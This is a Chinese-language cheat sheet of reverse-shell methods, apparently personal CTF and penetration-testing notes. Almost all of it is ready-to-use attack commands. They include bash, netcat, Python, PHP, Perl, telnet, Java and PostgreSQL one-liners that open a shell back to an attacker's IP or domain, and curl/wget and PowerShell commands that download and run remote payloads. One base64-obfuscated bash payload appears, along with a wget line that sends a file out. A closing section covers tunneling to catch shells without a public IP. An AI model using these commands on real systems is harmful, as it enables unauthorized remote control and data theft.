[反弹Shell大全与原理](https://mp.weixin.qq.com/s/ClqEAqpPxlscNJphSBfhKA)
[Ladon | 22种反弹Shell方法 openssl\\java\\py\\php\\perl\\lua\\curl\\socat ncat ruby](https://mp.weixin.qq.com/s/oPFxDxaUb9eGm-zrJzP55g)

- TheFatRat 创建反弹shell

## 反弹Shell
https://www.cnblogs.com/xiaozi/p/13493010.html

如果是php_shell, `?c=system('wget http://xxx')` , `wget xxx` 这里要进行url编码

windows上传 `certutil -urlcache -split -f http://11.1.63.37/nc.exe nc.exe`

nc参数
```shell
-l              listen mode, for inbound connects
-L              listen harder, re-listen on socket close
-v              verbose [use twice to be more verbose]
```

__bash连接__
```shell
# 攻击机器
nc -lvp 7777

# 被攻击机 , 不要在zsh 
/bin/bash -i >& /dev/tcp/攻击机ip/7777 0>&1 
curl http://攻击机ip:2126/sa.sh|bash

## curl: shell.txt,内容为bash -i >& /dev/tcp/攻击机ip/7777 0>&1
curl 192.168.1.20|bash
nc 127.0.0.1 7777 -e /bin/bash
nc 127.0.0.1 7777 -e cmd.exe                       // Windows
nc 127.0.0.1 7777 -e c:\windows\system32\cmd.exe   // Windows

## nc连接无 -e 参数
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 1.1.1.1 7777 1>/tmp/backpipe

nc -e /bin/sh 192.168.50.161 4444
## python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.32.1",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
## php
php -r '$sock=fsockopen("192.168.32.1",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
## perl - Linux
perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
## perl - Windows
perl -e 'use Socket;$i="47.101.57.72";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## telnet , 攻击机监听2个端口 nc -lvvp 4445, nc -lvvp 4444
telnet 192.168.50.161 4444 | /bin/bash | telnet 192.168.50.161 4445
```


__powershell__
```bat
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.183.1:8080/powercat.ps1');powercat -c 192.168.183.1 -p 4444 -e cmd
```

__利用被攻击机ip__
其他都是需要攻击机ip，这个则相反。我的理解是需要攻击机ip的相当于把shell弹给攻击机(所以攻击机ip和bash在一行代码)，而这个相当于在本地端口开个shell,攻击机访问端口来拿shell
```shell
nc 1.1.1.1 7777

# 被攻击机输入
nc -lvp 7777 -e /bin/bash
```

python 方式2
```py
#!/usr/bin/python
#-*- coding: utf-8 -*-
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.20.151",7777)) #更改localhost为自己的外网ip,端口任意
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

客户机
```
curl 192.168.1.20/shell.py|python
```

__wget__ 反弹shell
```
靶机:
wget --post-file /flag http://ip:port/
wget http://wgf4242.51vip.biz/shell.txt -O /tmp/x.php && php /tmp/x.php 
wget 192.168.20.130/shell.txt -O /tmp/x.php && php /tmp/x.php
http://xxx/wget?argv=1&argv=--post-file&argv=/flag&argv=http://wgf4242.51vip.biz:34578
vps攻击机: nc -lvp 2333
```

shell.txt内容
```php
<?php
$sock=fsockopen("1.1.1.1",7777);//localhost为自己的外网ip，端口任意
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```
python -m http.server --bind 0.0.0.0 8080

__java__ 反弹shell
[Runtime执行linux命令时管道符不生效](https://mp.weixin.qq.com/s/EhatzI7QVmh_RQZYOWNBYg)

```java
public class Revs {
public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

Runtime执行linux命令时管道符不生效, 用base64编码内容
```sh
#bash
bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yLjMuNC8yMjIzIDA+JjEg}|{base64,-d}|{bash,-i}
#python
python -c exec('L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yLjMuNC8yMjIzIDA+JjEg'.decode('base64'))
```

__postgres__ 反弹shell

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '/bin/bash -i >& /dev/tcp/11.1.xx.xx/1234 0>&1';
-- COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```


### 无公网IP反弹shell

https://www.bilibili.com/video/BV1pq4y1U7CR

方法1:
花生壳开 127.0.0.1 54321端口 得到tcp://397j302b56.zicp.vip:37932
本机nc -lvvnp 54321
远程 /?c=system("nc wgf4242.51vip.biz 39672 -e /bin/sh");

方法2:
花生壳开虚拟机地址 192.168.0.102 54321 得到tcp://397j302b56.zicp.vip:37932
本机A IP是192.168.0.100, 电脑B 192.168.0.100, 虚拟机C属于电脑B是192.168.247.128
如何让A与C互通
虚拟机C nc -lvvnp 54321
花生壳PC$ netsh interface portproxy add v4tov4 listenaddress=192.168.0.102 listenport=54321 connectaddress=192.168.247.128 connectport=54321

bash -i >& /dev/tcp/397j302b56.zicp.vip/22599 0>&1
